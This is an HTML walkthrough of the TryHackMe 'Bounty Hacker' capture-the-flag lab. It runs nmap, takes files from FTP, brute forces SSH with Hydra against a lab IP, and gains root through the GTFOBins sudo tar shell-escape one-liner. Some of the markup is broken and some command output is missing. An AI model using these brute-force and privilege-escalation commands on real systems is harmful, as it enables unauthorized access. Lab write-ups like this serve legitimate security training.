    <h1>Bounty Hacker CTF on TryHackMe</h1>

    <h2>Introduction</h2>
    <p>You boasted about your elite hacker skills in a bar, and now a group of Bounty Hunters challenges you to prove it.</p>

    <h2>Step 1: Getting Started with Network Scanning with NMAP</h2>
    <pre>
        nmap -A $IP
    </pre>
    <p>We start by scanning the network using NMAP with aggressive mode to gather information about open ports and services.</p>

    <h3>Results:</h3>

    <h2>Step 2: Start Enumeration with FTP</h2>
    <pre>

**Both files** task.txt and locks.txt downloaded! 

    Now, task.txt and you get the flag for Q3. And, save both of these files, they might be used later.</pre>
    
      <h2>Step 3:Next Flag</h2>
        <pre>
     <p>Now, you have to answer the Q4: **What service can you bruteforce with the text file found?**

This question has two answers, as we can try to brute force the FTP server, it responds with the wrong answer. 
Then the second one is SSH. And, yeah, you got it!
Now, you are almost done the half of the room! BRAVO! You can become an elite hacker in the future, just carry on and be persistent.</p> 
        </pre>
  
    <h2>Step 4: Brute Forcing SSH</h2>
    <pre>   
 <p> Do you know what is the users password?

To find it you first have to consider the available credentials and if the doesn’t work, then you can  think further!
What we have right now is: 

- 3 open port
- 1 task.txt file which contains a name that might be a user.
- 1 locks.txt file which has a wordlist that might be the passwords.

Now, to find the password of the users, you can use a password brute-forcer like Hydra. </p>

Command: <p> hydra -l lin -P locks.txt 10.10.253.164 ssh  </p>

<h4>Command Description:</h4> 

Here's a breakdown of the command:
<pre>
- **`hydra`**: invokes the Hydra password-cracking tool
- **-l `lin`**: specifies the username to use for the attack
- **-P `locks.txt`**: specifies the file containing a list of passwords to try
- **`10.10.253.164`**: specifies the IP address of the SSH server to attack
- **`ssh`**: specifies the protocol to use for the attack (in this case, SSH)
</pre>
<p>Now, hit that command! </p>

user.txt</pre>  
<p>BRAVO! You are an elite HACKER! You just got the user.txt flag. 

Wait, but actually, we are looking for the users password, right?
Let’s think about where can be the additional users other than lin…..
Wait, we just did FTP till now, let’s look for other ports: its HTTP 80.
But it looks like just a conversation between these guys, they can be the users. 

Lets create a users.txt file and add all the names on it using nano text editor. </p>

<h2>Step 5: Escalating Privileges</h2>
<pre> Now, you have to brute force again using Hydra via ssh, because that is all that we’ve got.

Command: hydra ssh://10.10.253.164 -L users.txt -P locks.txt

      <pre>  Unfortunately, we found nothing!

        Wait, are you as dumb as me? We found that user's password earlier. Do you have any guesses?

        Don’t worry! I’ll tell you. This above result shows that there is no user available from that list we created. It means the user is lin himself. Ultimately, the password is the exact one we found before. </pre>
       
        <h2>Step 6: Obtaining Root Flag</h2>
        <p> Now, we have a user lin and his password.
        We have to find the root flag, so we have to escalate our permissions.

        Let’s log in to the server again via SSH for lin. </p>

lin@bountyhacker:~/Desktop$ </pre>       
        
        <p> Now, you have to find out what commands you can run from lin’s access.
  Hit a command: sudo -l </p>

<pre>lin@bountyhacker:~/Desktop$ sudo -l
[sudo] password for lin:
Sorry, try again.
[sudo] password for lin:
Matching Defaults entries for lin on bountyhacker:
env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User lin may run the following commands on bountyhacker:
(root) /bin/tar</pre>

      <p> As you can see, we can execute tar as root.
        Now, without wasting any time, let’s get into <a href="https://gtfobins.github.io/" target="_blank">GTFOBins</a> and search for tar.
        After you get into that binary page, navigate to a subsection for SUDO.

        You will find something like this:</p>

      <pre>"'If the binary is allowed to run as a superuser by sudo, the payload below does not drop the elevated privileges and may be used to access the file system, escalate, or maintain privileged access.'"</pre>

        <code>sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code>

        Now, execute that command payload.

        <pre>#lin@bountyhacker:~/Desktop$ sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
              tar: Removing leading `/' from member names</pre>


        <p>Now, check who you are by running <code>whoami</code>.</p>
        

        <pre>#whoami
        <code>root</code></pre>

        <pre>$$$ BRAVO! You are now root.

        Now, you have to find the root.txt flag. 
        To find it on the file system, just run <code>locate root.txt</code>.</pre>

  <pre> #locate root.txt
        <code>/root/root.txt</code>
        #cat /root/root.txt
        <code>XxXxXxXxXxXxXx</code></pre>

       <H1> Felicitaciones! You did it! </H1>
